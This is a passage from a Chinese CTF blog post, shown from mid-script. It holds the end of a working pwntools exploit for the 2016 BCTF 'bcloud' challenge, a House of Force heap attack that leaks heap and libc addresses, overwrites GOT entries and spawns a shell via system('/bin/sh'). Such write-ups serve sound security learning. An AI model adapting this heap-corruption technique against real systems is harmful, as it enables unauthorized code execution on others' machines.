r.sendline(str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'Input the new content:'</span>)</span><br><span class="line">    r.sendline(value)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    r.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Input the id:'</span>)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"*********************************************泄漏堆基址 Heap_first_chunk_mem_addr"</span></span><br><span class="line"><span class="comment">#gdb.attach(r,'b *0x080487DD')</span></span><br><span class="line">r.recvuntil(<span class="string">'Input your name:'</span>)</span><br><span class="line">r.send(<span class="string">'A'</span><span class="number">*0</span>x40)</span><br><span class="line">r.recvuntil(<span class="string">'A'</span><span class="number">*0</span>x40)</span><br><span class="line"></span><br><span class="line"><span class="attribute">Heap_base_addr</span>=u32(r.recvuntil('!').strip('!'))</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"Heap base address is "</span>+hex(Heap_base_addr) #泄漏堆基址 Heap_first_chunk_mem_addr is 0x950b008</span><br><span class="line"> </span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"*********************************************************make top_chunk_size :0xFFFFFFFF"</span></span><br><span class="line">r.recvuntil(<span class="string">'Org:'</span>)</span><br><span class="line">r.send(<span class="string">'B'</span><span class="number">*0</span>x40)</span><br><span class="line">r.recvuntil(<span class="string">'Host:'</span>)</span><br><span class="line">r.sendline(p32(0xFFFFFFFF))</span><br><span class="line"></span><br><span class="line">                                 #                          base: 0x81d6000</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">creat(0x40,<span class="string">'Chunk1'</span>)             #0   0x81d6120   chunk0</span><br><span class="line">creat(0x40,<span class="string">'Chunk2'</span>)             #1   0x81d6120   chunk1</span><br><span class="line">creat(0x40,<span class="string">'/bin/sh\x00'</span>)        #2   0x81d6168   chunk2</span><br><span class="line">creat(0x40,<span class="string">'Chunk4'</span>)             #3   0x81d61b0   chunk3     top: 0x81d61f8</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"**************计算malloc 参数应该是多少，使得下下次malloc可申请到 我们的目的chunk(note_list:0x0804B120)"</span></span><br><span class="line"><span class="attribute">old_top_chunk_head</span>=Heap_base_addr+(0x40+0x8)*7-4*2</span><br><span class="line"><span class="attribute">new_top_chunk_head</span>=0x0804B120-0x4*2</span><br><span class="line">creat(new_top_chunk_head-old_top_chunk_head-4<span class="number">*2</span>,<span class="string">'Chunk_fake'</span>)     # fake chunk4  #4</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"*********************************************************构造 plt_puts(got_puts)"</span></span><br><span class="line">creat(0x40,p32(bcloud.got[<span class="string">'puts'</span>])+p32(bcloud.got[<span class="string">'free'</span>]))   #5  chunk5    #0 chunk0 #chunk1</span><br><span class="line"><span class="builtin-name">edit</span>(1,p32(bcloud.plt[<span class="string">'puts'</span>])) </span><br><span class="line">delete(0)                        # plt_puts(got_puts)  </span><br><span class="line">r.recvline()</span><br><span class="line"><span class="attribute">libc_base_addr</span>=u32(r.recv()[:4])-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="attribute">system_addr</span>=libc_base_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"libc_base_addr is "</span>+hex(libc_base_addr)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"system_addr is "</span>+hex(system_addr)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">""</span><span class="string">"*********************************************************构造 system("</span>/bin/sh\x00<span class="string">")"</span><span class="string">""</span></span><br><span class="line">r.sendline(<span class="string">'3'</span>)                  #edit</span><br><span class="line">r.recvuntil(<span class="string">'Input the id:'</span>)</span><br><span class="line">r.sendline(str(1))</span><br><span class="line">r.recvuntil(<span class="string">'Input the new content:'</span>)</span><br><span class="line">r.sendline(p32(system_addr))</span><br><span class="line"><span class="builtin-name">edit</span>(2,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(2)                       # system(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>成功拿到shell 效果图：<br><img src="https://s1.ax1x.com/2020/04/30/JHD42R.png" alt="JHD42R.png"></p>

      
    </div>

    <div>
      
        
      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/堆学习/" rel="tag">#堆学习</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/04/28/unlink 再学习及unlink_hitcon2014_stkof题解/" rel="next" title="unlink 再学习及unlink_hitcon2014_stkof题解">
                <i class="fa fa-chevron-left"></i> unlink 再学习及unlink_hitcon2014_stkof题解
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/04/30/今天你pwn了吗(三)/" rel="prev" title="今天你pwn了吗(三)">
                今天你pwn了吗(三) <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="木头">
          <p class="site-author-name" itemprop="name">木头</p>
          <p class="site-description motion-element" itemprop="description">做个靠谱的人！</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">56</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">20</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          
		  <br>
		  <span id="busuanzi_container_site_uv">
			<b><span id="busuanzi_value_site_uv"></span></b><br>
			<span class="site-state-item-name">访客</span>
			</span>


        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=453175619&auto=0&height=32"></iframe>

    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=805197&auto=1&height=32"></iframe>
    
		<br>
		<div align="left" font-family: "arial","microsoft yahei","黑体","宋体",sans-serif>
		<b><h1>个人简介</h1></b>
		<p>姓名：木头<br>
		性别：男<br>
		QQ：1594783824<br>
		爱好：书,球,歌<br>
		主要奖项： xxx</p>
		</div>
		<br>

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞关键代码："><span class="nav-number">1.</span> <span class="nav-text">漏洞关键代码：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#例子："><span class="nav-number">2.</span> <span class="nav-text">例子：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-training-lab-11"><span class="nav-number">3.</span> <span class="nav-text">HITCON training lab 11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exp："><span class="nav-number">4.</span> <span class="nav-text">exp：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2016-BCTF-bcloud"><span class="nav-number">5.</span> <span class="nav-text">2016 BCTF bcloud</span></a></li></ol></div>
            
          </div>
        </section>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">木头</span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>

</div>


<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>



  



  



  
  
  

  

  

</body>
</html>
